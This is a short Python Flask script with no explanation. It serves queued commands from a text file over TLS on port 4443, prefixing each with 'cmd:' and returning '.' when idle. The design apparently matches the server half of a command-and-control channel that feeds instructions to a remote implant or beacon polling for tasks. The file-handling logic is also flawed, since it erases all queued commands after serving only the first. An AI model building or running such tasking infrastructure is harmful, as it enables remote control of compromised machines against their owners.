from flask import Flask
import ssl

app = Flask(__name__)
commands_file = 'commands.txt'

@app.route('/commands')
def commands():
    try:
        with open(commands_file, 'r+') as f:
            commands = f.readlines()
            if commands:
                # Fetch the first command and strip newline characters
                next_command = commands[0].strip()
                # Clear the file content after fetching the command
                f.truncate(0)
                return f"cmd:{next_command}"
            else:
                return "."
    except FileNotFoundError:
        return "."

if __name__ == '__main__':
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain('cert.pem', 'key.pem')
    app.run(host='0.0.0.0', port=4443, ssl_context=context)
